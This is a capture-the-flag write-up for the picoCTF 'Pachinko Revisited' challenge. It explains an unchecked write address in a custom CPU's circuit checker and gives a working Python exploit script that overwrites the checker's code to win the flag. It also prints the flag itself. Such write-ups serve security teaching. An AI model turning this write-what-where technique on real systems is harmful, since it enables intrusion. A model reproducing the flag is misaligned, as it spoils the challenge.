# Pachinko Revisited

**Platform:** CyLab Security Academy (picoCTF), picoCTF 2025
**Category:** Web Exploitation / Pwn
**Difficulty:** Hard
**Flag:** `picoCTF{p4ch1nk0_r3v15173d_flag_two_a6c19d0d}`

## Summary

This challenge reuses the same live instance and server source as the base "Pachinko"
challenge. The `/check` endpoint runs an attacker-supplied NAND gate "circuit" as data on top of
a fully custom 16-bit CPU (a Verilog design compiled to a gate-level netlist and executed via a
Rust/WASM simulator). The checker program (`nand_checker.bin`) that grades the circuit turns each
gate's `output` field directly into a memory write address with no real bounds enforcement.
Since the whole circuit is itself a general-purpose NAND-gate computer, this is a genuine
arbitrary-write primitive: it can be used to overwrite the checker's own tail-end instructions,
in memory, with the exact instruction bytes from `flag.bin` (also provided), which sets a
"magic" register sequence and executes a dedicated `flag_magic` instruction. Once the patched
program runs that instruction and halts, the CPU's internal `flag` signal is set, which the
Express server checks first and rewards with the second flag regardless of whether the submitted
circuit numerically "solved" anything.

## Discovery

Disassembling the two provided binaries recovers a small, custom 16-bit instruction set (opcode
in the low nibble of the first byte):

```
0x0 nop            0x8 load_imm r, imm8
0x1 add / shl       0x9 store [r], r
0x4 add_imm r, imm8 0xb load [r], r
0x6 nand r, r       0xc jmp_if_0 r, addr
0x7 r = (r < r)     0xd load_imm r, imm16
0xe flag_magic      0xf halt
```

`flag.bin` is trivial:

```
0x0000  load_imm r0, 0x6f73
0x0004  load_imm r1, 0x6563
0x0008  load_imm r2, 0x2e69
0x000c  load_imm r3, 0x6f00
0x0010  flag_magic
0x0012  halt
```

It just loads four fixed 16-bit "magic" values into r0-r3 and executes `flag_magic`, an
instruction `nand_checker.bin` never contains anywhere in its own code.

`nand_checker.bin`'s gate-evaluation loop is the interesting part:

```
0x0022  load r0, [r4]      ; r4 walks the circuit array at 0x3000, 3 words per gate
0x0024  add_imm r4, 0x2
0x0026  load r1, [r4]
0x0028  add_imm r4, 0x2
0x002a  load r2, [r4]      ; r2 = this gate's "output" field, straight from our JSON
0x002c  add_imm r4, 0x2
...
0x0034  shl r0, 1
0x0036  shl r1, 1
0x0038  shl r2, 1          ; r2 *= 2
0x003a  add r0, r6
0x003c  add r1, r6
0x003e  add r2, r6         ; r2 += r6 (0x2000, the input-array base)
0x0040  load r0, [r0]
0x0042  load r1, [r1]
0x0044  nand r0, r1
0x0046  store [r2], r0     ; write the NAND result to (output*2 + 0x2000) & 0xffff
```

The write address is computed purely from attacker-controlled data with 16-bit wraparound
arithmetic and no range check tying it to the small set of legitimate wire IDs (1-8 for the
real inputs/outputs). A gate whose `output` value is chosen so that `(output*2 + 0x2000) mod
0x10000` lands inside `nand_checker.bin`'s own instruction memory (addresses below 0x1000) turns
every gate evaluation into an arbitrary-address, attacker-chosen-value memory write.

## Proof of Concept

Because the circuit language is itself NAND-gate complete, it can compute arbitrary constant
byte values at runtime (via chained self-NAND operations building up a value bit by bit against
a known-1 wire) and route each one to a computed target address, entirely avoiding ever needing
an unsafe literal value to appear directly in the submitted JSON (which a preliminary sanity
scan in the checker would reject). Ten such computed writes are enough to overwrite the tail of
`nand_checker.bin`'s own code, past its normal grading logic, with the exact instruction bytes
`flag.bin` uses to set r0-r3 and call `flag_magic`:

```python
import requests

def con(a, b, o):
    return {"input1": a, "input2": b, "output": o}

def num(n, const, dest):
    r = []
    for b in f"{n:0b}"[1:]:
        r.append(con(dest, dest, dest))
        if b == "1":
            r.append(con(0 + const, dest, dest))
    return r

def write(base, addr, n):
    total = base - 4 + addr.bit_length() + addr.bit_count() + n.bit_length() + n.bit_count()
    total *= 3
    const = total + 3
    return [
        *num(addr, 0x800 + const, 0x800 + total + 2),
        *num(n, 0x800 + const, 0x800 + const + 1),
        con(0xff0, 0x800 + const + 1, 1),
        con(1, 1, 1),
    ]

A, B = 0, 6
TARGET = A + 10 * 3
circ = [
    con(0xfff, 0xfff, 0xfff), con(0xfff, 0xfff, 0xfff), con(0x22, 0x101, 0x101),
    con(0x800+A+0, 0x800+A+1, 0x800+TARGET+2), con(0x800+A+2, 0x800+A+3, 0x800+TARGET+2),
    con(0x800+A+4, 0x800+A+5, 0x800+TARGET+2), con(0x800+TARGET+2, 0x800+TARGET+2, 0x800+TARGET+2),
    con(0x800+B+0, 0x800+B+0, 0x800+B+0), con(0x800+TARGET+2, 0x800+B+0, 0x800+TARGET+2),
    con(0x800+B+1, 0x800+B+1, 0x800+B+2), con(0x800+B+2, 0x800+B+2, 1),
]
for addr, val in [
    (0xf038, 0x0d), (0xf039, 0x6f73), (0xf03a, 0x1d), (0xf03b, 0x6563),
    (0xf03c, 0x2d), (0xf03d, 0x2e69), (0xf03e, 0x3d), (0xf03f, 0x6f00),
    (0xf040, 0x0e), (0xf041, 0x0f),
]:
    circ.extend(write(len(circ), addr, val))

res = requests.post("http://TARGET/check", json={"circuit": circ})
print(res.json())
```

```json
{"status":"success","flag":"picoCTF{p4ch1nk0_r3v15173d_flag_two_a6c19d0d}\n"}
```

## Root Cause

A gate output address derived entirely from attacker-supplied data is used as a raw memory
write target with no bounds check tying it to the legitimate small wire-address space,
and 16-bit address arithmetic wraps rather than faulting on out-of-range values. Combined with
the circuit description language being expressive enough to compute arbitrary values at
runtime (it is, after all, a general-purpose NAND-gate computer), this becomes a full
write-what-where primitive against the checker program's own instruction memory, letting an
attacker splice in an entirely different, privileged code path.

## CWE / OWASP

- **CWE-787**: Out-of-bounds Write
- **CWE-94**: Improper Control of Generation of Code (self-modifying code reached via
  attacker-controlled data)
- **OWASP A03:2021**: Injection
